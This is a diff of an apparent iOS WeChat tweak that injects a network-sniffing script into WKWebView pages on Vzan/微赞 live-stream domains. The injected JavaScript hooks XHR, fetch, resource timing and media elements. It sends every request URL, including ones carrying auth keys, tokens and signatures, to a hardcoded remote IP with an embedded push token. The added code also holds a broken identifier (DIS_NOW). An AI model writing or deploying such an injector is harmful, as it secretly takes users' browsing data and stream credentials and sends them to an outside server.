@@ -1,9 +1,7 @@
-// ALIWeChatWKSniffer_Reinject.m
-// 关键改动：
-// 1) swizzle WKWebView 的 setNavigationDelegate:，注入代理，导航完成后自动 evaluate 注入脚本
-// 2) swizzle initWithFrame:configuration:，对“之后创建的 WKWebView”直接塞入 WKUserScript(documentStart, forMainFrameOnly:NO) + message handler
-// 3) JS 内部增加 SPA 重注入（history.pushState/replaceState/popstate）
-// 4) 仍然把所有事件原样 JSON 上报；命中疑似流地址本地弹窗+复制
+// ALIWeChatWKSniffer_SafeGate.m
+// 目标：仅在进入 Vzan/微赞直播页后，且文档 ready，再注入JS（避免过早注入导致的闪退）
+// 机制：定时扫描现有 WKWebView -> 对其添加 KVO(URL/estimatedProgress) -> 命中目标域名且进度>=0.8 -> 再次确认 readyState -> 注入
+// 收集：抓啥都上报；命中流地址（m3u8/flv/auth_key…）本地弹窗+复制
 
 #import <Foundation/Foundation.h>
 #import <UIKit/UIKit.h>
@@ -16,11 +14,16 @@ static NSString * const kPushHost  = @"http://139.155.57.242:8088";
 static NSString * const kPushToken = @"@Yy166431";
 static inline NSArray<NSString*> *kPushPaths(void){ return @[@"/api/push_raw", @"/api/push_form", @"/push", @"/push_raw"]; }
 
-static const NSTimeInterval kFirstDelay     = 1.2;
-static const NSTimeInterval kScanInterval   = 1.5;
-static const NSTimeInterval kDedupeWindow   = 60.0;
-static const BOOL kShowPopupOnInject        = YES;
-static const BOOL kShowPopupOnHit           = YES;
+static const NSTimeInterval kScanInterval   = 1.2;   // 扫描现有 WKWebView 的间隔
+static const NSTimeInterval kDedupeWindow   = 60.0;  // URL 去重
+static const NSTimeInterval kInjectDelay    = 0.6;   // 达到条件后再延迟注入，进一步稳妥
+static const BOOL kShowPopupOnInject        = YES;   // 注入时提示
+static const BOOL kShowPopupOnHit           = YES;   // 命中流地址时弹窗+复制
+
+// 目标域名（可增改）
+static NSArray<NSString*> *TargetHosts(void) {
+    return @[@"ukmdg.cn", @"vzuk.ukmdg.cn", @"wehfws.vzuk.ukmdg.cn", @"vzan.com", @"weizan.com"];
+}
 
 #ifndef DEBUG_LOG
 #define DEBUG_LOG 0
@@ -31,7 +34,7 @@ static const BOOL kShowPopupOnHit           = YES;
 #define LOG(...)
 #endif
 
-#pragma mark - 工具 & 状态
+#pragma mark - 工具/状态
 
 static dispatch_queue_t gq;
 static NSMutableDictionary<NSString*, NSDate*> *g_seen;
@@ -126,7 +129,6 @@ static NSString *jsonStringify(NSDictionary *obj){
 static void handleRawEvent(NSDictionary *evt){
     NSString *js = jsonStringify(evt);
     if (js) postText(js);
-
     NSString *u = evt[@"url"];
     if (u && looksLikeStream(u) && !dedupe_skip(u)) {
         if (kShowPopupOnHit){
@@ -137,7 +139,7 @@ static void handleRawEvent(NSDictionary *evt){
     }
 }
 
-#pragma mark - JS（带 SPA 监听 + 全量采集）
+#pragma mark - JS（与上一版一致：抓啥都上报）
 
 static NSString *inpageJS(void){
     return @
@@ -148,51 +150,35 @@ static NSString *inpageJS(void){
         "if(u.indexOf('.m3u8')!=-1||u.indexOf('.flv')!=-1||u.indexOf('.ts')!=-1||u.indexOf('.mp4')!=-1) return true;"
         "if(u.indexOf('auth_key=')!=-1||u.indexOf('txsecret')!=-1||u.indexOf('txkey')!=-1||u.indexOf('token=')!=-1||u.indexOf('sign=')!=-1||u.indexOf('auth=')!=-1) return true;"
         "if(u.indexOf('phonelive')!=-1||u.indexOf('vzan')!=-1||u.indexOf('weizan')!=-1||u.indexOf('pull.')!=-1||u.indexOf('replay')!=-1||u.indexOf('live')!=-1) return true;return false;}"
-      "if(!window.__ALI_SNIF_BOOT__){"
-        "window.__ALI_SNIF_BOOT__=function(){try{"
-          "send('INJECT_OK',{});"
-          // XHR
-          "(function(){var O=XMLHttpRequest.prototype.open,S=XMLHttpRequest.prototype.send;if(XMLHttpRequest.prototype.__ali_patched__)return;XMLHttpRequest.prototype.__ali_patched__=true;"
-            "XMLHttpRequest.prototype.open=function(m,u){try{this.__ali_u=u?u.toString():'';this.__ali_m=(m||'').toString();}catch(e){}return O.apply(this,arguments)};"
-            "XMLHttpRequest.prototype.send=function(b){try{var self=this,u=self.__ali_u||'',m=self.__ali_m||'';if(u){send('XHR_REQ',{from:'xhr',url:u,method:m});}"
-              "var onload=function(){try{var ct=(self.getResponseHeader?self.getResponseHeader('Content-Type'):'')||'';var st=(self.status||0);var sample=null;"
-                "if(ct.toLowerCase().indexOf('mpegurl')!=-1&&self.responseText){sample=self.responseText.slice(0,256);}else if(self.responseText&&self.responseText.indexOf('#EXTM3U')!=-1){sample=self.responseText.slice(0,256);ct=ct||'application/vnd.apple.mpegurl';}"
-                "send('XHR_RSP',{from:'xhr',url:u,method:m,status:st,ctype:ct,sample:sample});if(looks(u))send('HIT',{from:'xhr',url:u});}catch(e){}};"
-              "this.addEventListener&&this.addEventListener('load',onload);}catch(e){}return S.apply(this,arguments)};"
-          "})();"
-          // fetch
-          "(function(){if(!window.fetch||window.fetch.__ali_patched__)return;var F=window.fetch;window.fetch.__ali_patched__=true;"
-            "window.fetch=function(i,init){try{var u=(typeof i==='string')?i:(i&&i.url)||'';var m=(init&&init.method)||'GET';if(u){send('FETCH_REQ',{from:'fetch',url:u,method:m});}"
-              "return F.apply(this,arguments).then(function(r){try{var ct=r.headers&&r.headers.get&&r.headers.get('content-type')||'';var st=r.status||0;var c=r.clone&&r.clone();"
-                "if(c&&c.text){c.text().then(function(t){var sample=null;if(t&&t.indexOf('#EXTM3U')!=-1){sample=t.slice(0,256);if(!ct)ct='application/vnd.apple.mpegurl';}"
-                  "send('FETCH_RSP',{from:'fetch',url:u,method:m,status:st,ctype:ct,sample:sample});}).catch(function(){send('FETCH_RSP',{from:'fetch',url:u,method:m,status:st,ctype:ct});});}"
-                "else{send('FETCH_RSP',{from:'fetch',url:u,method:m,status:st,ctype:ct});}if(looks(u))send('HIT',{from:'fetch',url:u});}catch(e){}return r;});}"
-            "catch(e){return F.apply(this,arguments)}})();"
-          // resource observer
-          "(function(){if(!('PerformanceObserver'in window) || window.__ali_perf__)return;window.__ali_perf__=true;"
-            "try{var seen=new Set();var ob=new PerformanceObserver(function(list){try{var arr=list.getEntries();for(var i=0;i<arr.length;i++){var e=arr[i];var u=e.name||'';if(!u||seen.has(u))continue;seen.add(u);send('RES',{from:'perf',url:u,initiator:e.initiatorType||''});if(looks(u))send('HIT',{from:'perf',url:u});}}catch(e){}});"
-            "ob.observe({type:'resource',buffered:true});}catch(e){}})();"
-          // media
-          "(function(){if(window.__ali_media__)return;window.__ali_media__=true;"
-            "function report(el,tag,ev){try{var s=el.currentSrc||el.src||((el.querySelector&&el.querySelector('source'))||{}).src||'';if(s){send('MEDIA',{from:tag+':'+ev,url:s});if(looks(s))send('HIT',{from:tag,url:s});}}catch(e){}}"
-            "var obs=new MutationObserver(function(a){a.forEach(function(m){if(m.addedNodes){for(var i=0;i<m.addedNodes.length;i++){var n=m.addedNodes[i];"
-              "if(n&&n.tagName){var t=n.tagName.toLowerCase();if(t==='video'||t==='audio'){report(n,t,'add');n.addEventListener&&n.addEventListener('play',function(){report(this,t,'play')},false);} }"
-              "if(n&&n.querySelectorAll){var vs=n.querySelectorAll('video,audio');for(var j=0;j<vs.length;j++){var t2=vs[j].tagName.toLowerCase();report(vs[j],t2,'sub');vs[j].addEventListener&&vs[j].addEventListener('play',function(){report(this,this.tagName.toLowerCase(),'play')},false);} }}}});});"
-            "obs.observe(document.documentElement||document.body,{childList:true,subtree:true});"
-            "var vs=document.querySelectorAll&&document.querySelectorAll('video,audio');for(var k=0;k<(vs?vs.length:0);k++){var t=vs[k].tagName.toLowerCase();report(vs[k],t,'init');vs[k].addEventListener&&vs[k].addEventListener('play',function(){report(this,this.tagName.toLowerCase(),'play')},false);} "
-            "var setA=Element.prototype.setAttribute;if(!Element.prototype.__ali_setattr__){Element.prototype.__ali_setattr__=true;Element.prototype.setAttribute=function(k,v){try{if(this.tagName){var t=this.tagName.toLowerCase();if((t==='video'||t==='audio')&&k&&k.toLowerCase()==='src'){send('MEDIA_SET',{from:'setAttr',url:v});if(looks(v))send('HIT',{from:'setAttr',url:v});}}}catch(e){}return setA.apply(this,arguments)};}"
-          "})();"
-        "}catch(e){console.log('boot error',e)}};"
-      "}"
-      // 首次立即 boot；并监听 SPA 路由变化
-      "window.__ALI_SNIF_BOOT__();"
-      "(function(){if(window.__ali_spa__)return;window.__ali_spa__=true;"
-        "var _ps=history.pushState,_rs=history.replaceState;history.pushState=function(){try{var r=_ps.apply(this,arguments);setTimeout(window.__ALI_SNIF_BOOT__,0);return r;}catch(e){return _ps.apply(this,arguments)}};"
-        "history.replaceState=function(){try{var r=_rs.apply(this,arguments);setTimeout(window.__ALI_SNIF_BOOT__,0);return r;}catch(e){return _rs.apply(this,arguments)}};"
-        "window.addEventListener('popstate',function(){setTimeout(window.__ALI_SNIF_BOOT__,0)},false);"
-        "document.addEventListener('readystatechange',function(){if(document.readyState==='complete'){setTimeout(window.__ALI_SNIF_BOOT__,0)}},false);"
+      "send('INJECT_OK',{});"
+      "(function(){var O=XMLHttpRequest.prototype.open,S=XMLHttpRequest.prototype.send;if(XMLHttpRequest.prototype.__ali_patched__)return;XMLHttpRequest.prototype.__ali_patched__=true;"
+        "XMLHttpRequest.prototype.open=function(m,u){try{this.__ali_u=u?u.toString():'';this.__ali_m=(m||'').toString();}catch(e){}return O.apply(this,arguments)};"
+        "XMLHttpRequest.prototype.send=function(b){try{var self=this,u=self.__ali_u||'',m=self.__ali_m||'';if(u){send('XHR_REQ',{from:'xhr',url:u,method:m});}"
+          "var onload=function(){try{var ct=(self.getResponseHeader?self.getResponseHeader('Content-Type'):'')||'';var st=(self.status||0);var sample=null;"
+            "if(ct.toLowerCase().indexOf('mpegurl')!=-1&&self.responseText){sample=self.responseText.slice(0,256);}else if(self.responseText&&self.responseText.indexOf('#EXTM3U')!=-1){sample=self.responseText.slice(0,256);ct=ct||'application/vnd.apple.mpegurl';}"
+            "send('XHR_RSP',{from:'xhr',url:u,method:m,status:st,ctype:ct,sample:sample});if(looks(u))send('HIT',{from:'xhr',url:u});}catch(e){}};"
+          "this.addEventListener&&this.addEventListener('load',onload);}catch(e){}return S.apply(this,arguments)};"
       "})();"
-      "console.log('[ALI_SNIF] injected (reinjection enabled)');"
+      "(function(){if(!window.fetch||window.fetch.__ali_patched__)return;var F=window.fetch;window.fetch.__ali_patched__=true;"
+        "window.fetch=function(i,init){try{var u=(typeof i==='string')?i:(i&&i.url)||'';var m=(init&&init.method)||'GET';if(u){send('FETCH_REQ',{from:'fetch',url:u,method:m});}"
+          "return F.apply(this,arguments).then(function(r){try{var ct=r.headers&&r.headers.get&&r.headers.get('content-type')||'';var st=r.status||0;var c=r.clone&&r.clone();"
+            "if(c&&c.text){c.text().then(function(t){var sample=null;if(t&&t.indexOf('#EXTM3U')!=-1){sample=t.slice(0,256);if(!ct)ct='application/vnd.apple.mpegurl';}"
+              "send('FETCH_RSP',{from:'fetch',url:u,method:m,status:st,ctype:ct,sample:sample});}).catch(function(){send('FETCH_RSP',{from:'fetch',url:u,method:m,status:st,ctype:ct});});}"
+            "else{send('FETCH_RSP',{from:'fetch',url:u,method:m,status:st,ctype:ct});}if(looks(u))send('HIT',{from:'fetch',url:u});}catch(e){}return r;});}"
+        "catch(e){return F.apply(this,arguments)}})();"
+      "(function(){if(!('PerformanceObserver'in window) || window.__ali_perf__)return;window.__ali_perf__=true;"
+        "try{var seen=new Set();var ob=new PerformanceObserver(function(list){try{var arr=list.getEntries();for(var i=0;i<arr.length;i++){var e=arr[i];var u=e.name||'';if(!u||seen.has(u))continue;seen.add(u);send('RES',{from:'perf',url:u,initiator:e.initiatorType||''});if(looks(u))send('HIT',{from:'perf',url:u});}}catch(e){}});"
+        "ob.observe({type:'resource',buffered:true});}catch(e){}})();"
+      "(function(){if(window.__ali_media__)return;window.__ali_media__=true;"
+        "function report(el,tag,ev){try{var s=el.currentSrc||el.src||((el.querySelector&&el.querySelector('source'))||{}).src||'';if(s){send('MEDIA',{from:tag+':'+ev,url:s});if(looks(s))send('HIT',{from:tag,url:s});}}catch(e){}}"
+        "var obs=new MutationObserver(function(a){a.forEach(function(m){if(m.addedNodes){for(var i=0;i<m.addedNodes.length;i++){var n=m.addedNodes[i];"
+          "if(n&&n.tagName){var t=n.tagName.toLowerCase();if(t==='video'||t==='audio'){report(n,t,'add');n.addEventListener&&n.addEventListener('play',function(){report(this,t,'play')},false);} }"
+          "if(n&&n.querySelectorAll){var vs=n.querySelectorAll('video,audio');for(var j=0;j<vs.length;j++){var t2=vs[j].tagName.toLowerCase();report(vs[j],t2,'sub');vs[j].addEventListener&&vs[j].addEventListener('play',function(){report(this,this.tagName.toLowerCase(),'play')},false);} }}}});});"
+        "obs.observe(document.documentElement||document.body,{childList:true,subtree:true});"
+        "var vs=document.querySelectorAll&&document.querySelectorAll('video,audio');for(var k=0;k<(vs?vs.length:0);k++){var t=vs[k].tagName.toLowerCase();report(vs[k],t,'init');vs[k].addEventListener&&vs[k].addEventListener('play',function(){report(this,this.tagName.toLowerCase(),'play')},false);} "
+        "var setA=Element.prototype.setAttribute;if(!Element.prototype.__ali_setattr__){Element.prototype.__ali_setattr__=true;Element.prototype.setAttribute=function(k,v){try{if(this.tagName){var t=this.tagName.toLowerCase();if((t==='video'||t==='audio')&&k&&k.toLowerCase()==='src'){send('MEDIA_SET',{from:'setAttr',url:v});if(looks(v))send('HIT',{from:'setAttr',url:v});}}}catch(e){}return setA.apply(this,arguments)};}"
+      "})();"
+      "console.log('[ALI_SNIF] injected (safe gate)');"
     "}catch(e){console.log('[ALI_SNIF] inject error',e)}})();";
 }
 
@@ -210,108 +196,109 @@ static NSString *inpageJS(void){
 
 static ALIMessageHandler *g_handler;
 
-#pragma mark - WKWebView 代理包装（转发原 delegate）
+#pragma mark - 仅在命中目标域名 & ready 时注入
 
-@interface ALIProxyNav : NSObject <WKNavigationDelegate>
-@property (nonatomic, weak) id<WKNavigationDelegate> real;
-@property (nonatomic, weak) WKWebView *webView;
-@end
-
-@implementation ALIProxyNav
-- (BOOL)respondsToSelector:(SEL)aSelector {
-    if ([super respondsToSelector:aSelector]) return YES;
-    return [self.real respondsToSelector:aSelector];
-}
-- (id)forwardingTargetForSelector:(SEL)aSelector { return self.real; }
-
-// 注入时机 1：允许导航前也可先下发轻量脚本（防早期丢失）
-- (void)webView:(WKWebView *)webView decidePolicyForNavigationAction:(WKNavigationAction *)navigationAction decisionHandler:(void (^)(WKNavigationActionPolicy))decisionHandler {
-    NSString *js = inpageJS();
-    [webView evaluateJavaScript:js completionHandler:nil];
-    if ([self.real respondsToSelector:_cmd]) {
-        [(id)self.real webView:webView decidePolicyForNavigationAction:navigationAction decisionHandler:decisionHandler];
-    } else {
-        decisionHandler(WKNavigationActionPolicyAllow);
-    }
-}
-
-// 注入时机 2：页面加载完成后再注入一次（稳）
-- (void)webView:(WKWebView *)webView didFinishNavigation:(WKNavigation *)navigation {
-    NSString *js = inpageJS();
-    [webView evaluateJavaScript:js completionHandler:nil];
-    if ([self.real respondsToSelector:_cmd]) {
-        [(id)self.real webView:webView didFinishNavigation:navigation];
-    }
-}
-@end
-
-#pragma mark - Swizzle
-
-static const void *kProxyKey = &kProxyKey;
 static const void *kInjectedKey = &kInjectedKey;
+static const void *kKVOKey      = &kKVOKey;
 
-static void ali_swizzle(Class cls, SEL sel, IMP imp, const char *types){
-    Method m = class_getInstanceMethod(cls, sel);
-    if (m){
-        IMP old = method_setImplementation(m, imp);
-        (void)old;
-    }else{
-        class_addMethod(cls, sel, imp, types);
+static BOOL hostMatches(NSURL *url){
+    if (!url.host) return NO;
+    NSString *h = url.host.lowercaseString;
+    for (NSString *pat in TargetHosts()){
+        if ([h hasSuffix:pat.lowercaseString]) return YES;
     }
+    return NO;
 }
 
-// setNavigationDelegate:
-static void (*orig_setNavDelegate)(id, SEL, id);
-static void ali_setNavDelegate(id self, SEL _cmd, id delegate){
-    // 包一层代理，转发给原 delegate
-    id proxy = objc_getAssociatedObject(self, kProxyKey);
-    if (!proxy){
-        proxy = [ALIProxyNav new];
-        objc_setAssociatedObject(self, kProxyKey, proxy, OBJC_ASSOCIATION_RETAIN_NONATOMIC);
-    }
-    [(ALIProxyNav*)proxy setReal:delegate];
-    [(ALIProxyNav*)proxy setWebView:self];
-    orig_setNavDelegate(self, _cmd, proxy);
-}
-
-// initWithFrame:configuration:
-static id (*orig_initFrameConf)(id, SEL, CGRect, WKWebViewConfiguration *);
-static id ali_initFrameConf(id self, SEL _cmd, CGRect frame, WKWebViewConfiguration *conf){
-    id ret = orig_initFrameConf(self, _cmd, frame, conf);
-    @try{
-        if (!g_handler) g_handler = [ALIMessageHandler new];
-        // 放一个 documentStart 的 user script，forMainFrameOnly:NO 覆盖所有 frame
-        WKUserContentController *ucc = conf.userContentController;
-        BOOL needHandler = YES;
-        for (WKUserScript *s in ucc.userScripts){ if ([s.source containsString:@"__ALI_SNIF_BOOT__"]){ needHandler = NO; break; } }
-        if (needHandler){
-            NSString *src = inpageJS();
-            WKUserScript *us = [[WKUserScript alloc] initWithSource:src injectionTime:WKUserScriptInjectionTimeAtDocumentStart forMainFrameOnly:NO];
-            [ucc addUserScript:us];
-            @try{ [ucc addScriptMessageHandler:g_handler name:@"__ALI_SNIF__"]; }@catch(__unused NSException *e){}
-        }
-    }@catch(__unused NSException *e){}
-    return ret;
-}
-
-#pragma mark - 扫描（兜底：对已存在 WKWebView evaluate）
-
-static void inject_into_existing(WKWebView *wv){
+static void try_inject_when_ready(WKWebView *wv){
     if (!wv) return;
-    NSNumber *flag = objc_getAssociatedObject(wv, kInjectedKey);
-    if (flag.boolValue) return;
-    objc_setAssociatedObject(wv, kInjectedKey, @(YES), OBJC_ASSOCIATION_RETAIN_NONATOMIC);
+    // 二次确认：进度/readyState
+    double prog = wv.estimatedProgress;
+    if (prog < 0.8) return;
 
-    if (!g_handler) g_handler = [ALIMessageHandler new];
-    @try{ [wv.configuration.userContentController addScriptMessageHandler:g_handler name:@"__ALI_SNIF__"]; }@catch(__unused NSException *e){}
-    NSString *js = inpageJS();
-    [wv evaluateJavaScript:js completionHandler:nil];
+    [wv evaluateJavaScript:@"document.readyState" completionHandler:^(id val, NSError *err){
+        if (err) return;
+        NSString *rs = [val isKindOfClass:NSString.class] ? (NSString*)val : @"";
+        if (![rs isEqualToString:@"complete"] && ![rs isEqualToString:@"interactive"]) return;
+
+        NSNumber *flag = objc_getAssociatedObject(wv, kInjectedKey);
+        if (flag.boolValue) return;
+
+        // 延迟一点再注入，进一步避免 race
+        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(kInjectDelay * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
+            // 再次检查
+            NSURL *u = wv.URL;
+            if (!hostMatches(u)) return;
+
+            objc_setAssociatedObject(wv, kInjectedKey, @(YES), OBJC_ASSOCIATION_RETAIN_NONATOMIC);
+
+            if (!g_handler) g_handler = [ALIMessageHandler new];
+            @try{ [wv.configuration.userContentController addScriptMessageHandler:g_handler name:@"__ALI_SNIF__"]; }@catch(__unused NSException *e){}
+
+            NSString *js = inpageJS();
+            [wv evaluateJavaScript:js completionHandler:nil];
+
+            if (kShowPopupOnInject){
+                popup(@"JS 注入成功", [NSString stringWithFormat:@"域名：%@\n页面已就绪，开始采集", u.host ?: @"(null)"], nil);
+            }
+
+            NSDictionary *evt = @{@"type": @"NATIVE_INJECT_OK",
+                                  @"app": @"WeChat",
+                                  @"page": (wv.URL.absoluteString ?: @""),
+                                  @"ts": @([[NSDate date] timeIntervalSince1970]*1000)};
+            NSString *s = jsonStringify(evt); if (s) postText(s);
+        });
+    }];
 }
+
+#pragma mark - KVO 监听 URL/进度
+
+@interface _ALIKVOBox : NSObject
+@property (nonatomic, weak) WKWebView *wv;
+@end
+@implementation _ALIKVOBox
+- (void)dealloc{
+    @try{
+        [self.wv removeObserver:self forKeyPath:@"URL"];
+        [self.wv removeObserver:self forKeyPath:@"estimatedProgress"];
+    }@catch(__unused NSException *e){}
+}
+- (void)observeValueForKeyPath:(NSString *)keyPath ofObject:(id)object change:(NSDictionary *)change context:(void *)ctx{
+    WKWebView *wv = (WKWebView *)object;
+    if (![wv isKindOfClass:WKWebView.class]) return;
+    if ([keyPath isEqualToString:@"URL"] || [keyPath isEqualToString:@"estimatedProgress"]) {
+        NSURL *u = wv.URL;
+        if (hostMatches(u)) {
+            try_inject_when_ready(wv);
+        }
+    }
+}
+@end
+
+static void attach_kvo_if_needed(WKWebView *wv){
+    if (!wv) return;
+    _ALIKVOBox *box = objc_getAssociatedObject(wv, kKVOKey);
+    if (box) return;
+    box = [_ALIKVOBox new]; box.wv = wv;
+    objc_setAssociatedObject(wv, kKVOKey, box, OBJC_ASSOCIATION_RETAIN_NONATOMIC);
+    @try{
+        [wv addObserver:box forKeyPath:@"URL" options:NSKeyValueObservingOptionNew context:NULL];
+        [wv addObserver:box forKeyPath:@"estimatedProgress" options:NSKeyValueObservingOptionNew context:NULL];
+    }@catch(__unused NSException *e){}
+}
+
+#pragma mark - 扫描现有 WKWebView（无 swizzle、无 documentStart）
 
 static void walk_view(UIView *v){
     if (!v) return;
     Class WK = NSClassFromString(@"WKWebView");
-    if (WK && [v isKindOfClass:WK]) inject_into_existing((WKWebView*)v);
+    if (WK && [v isKindOfClass:WK]){
+        WKWebView *wv = (WKWebView *)v;
+        attach_kvo_if_needed(wv);
+        if (hostMatches(wv.URL)) {
+            try_inject_when_ready(wv);
+        }
+    }
     for (UIView *sub in v.subviews) walk_view(sub);
 }
 
@@ -321,46 +308,15 @@ static void scan_loop(void){
             for (UIWindow *w in UIApplication.sharedApplication.windows) walk_view(w);
         }@catch(__unused NSException *e){}
     });
-    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(kScanInterval*NSEC_PER_SEC)), gq, ^{ scan_loop(); });
+    dispatch_after(dispatch_time(DIS_NOW, (int64_t)(kScanInterval*NSEC_PER_SEC)), gq, ^{ scan_loop(); });
 }
 
 #pragma mark - 入口
 
 __attribute__((constructor))
-static void ALIWeChatWKSnifferReinjectInit(void){
-    if (!gq)    gq    = dispatch_queue_create("com.aliwechat.wksniffer.reinject", DISPATCH_QUEUE_SERIAL);
+static void ALIWeChatWKSnifferSafeGateInit(void){
+    if (!gq)    gq    = dispatch_queue_create("com.aliwechat.wksniffer.safe", DISPATCH_QUEUE_SERIAL);
     if (!g_seen)g_seen= [NSMutableDictionary dictionary];
-
-    on_main(^{
-        // swizzle setNavigationDelegate:
-        Class WK = NSClassFromString(@"WKWebView");
-        if (WK){
-            SEL setNavSel = @selector(setNavigationDelegate:);
-            Method m = class_getInstanceMethod(WK, setNavSel);
-            if (m){
-                orig_setNavDelegate = (void*)method_getImplementation(m);
-                ali_swizzle(WK, setNavSel, (IMP)ali_setNavDelegate, method_getTypeEncoding(m));
-            }
-            // swizzle initWithFrame:configuration:
-            SEL initSel = @selector(initWithFrame:configuration:);
-            Method m2 = class_getInstanceMethod(WK, initSel);
-            if (m2){
-                orig_initFrameConf = (void*)method_getImplementation(m2);
-                ali_swizzle(WK, initSel, (IMP)ali_initFrameConf, method_getTypeEncoding(m2));
-            }
-        }
-
-        // 首次提示
-        if (kShowPopupOnInject){
-            popup(@"JS 注入通道建立", @"将自动在每次页面导航完成后重注入，并覆盖子 frame。", nil);
-            NSDictionary *evt = @{@"type": @"NATIVE_INJECT_READY",
-                                  @"app": @"WeChat",
-                                  @"ts": @([[NSDate date] timeIntervalSince1970]*1000)};
-            NSString *s = jsonStringify(evt);
-            if (s) postText(s);
-        }
-
-        // 对当前已存在的 WKWebView 先 evaluate 一次（兜底）
-        scan_loop();
-    });
+    // 首次不做任何注入，只启动扫描与KVO，等进入目标域名且ready再注入
+    scan_loop();
 }
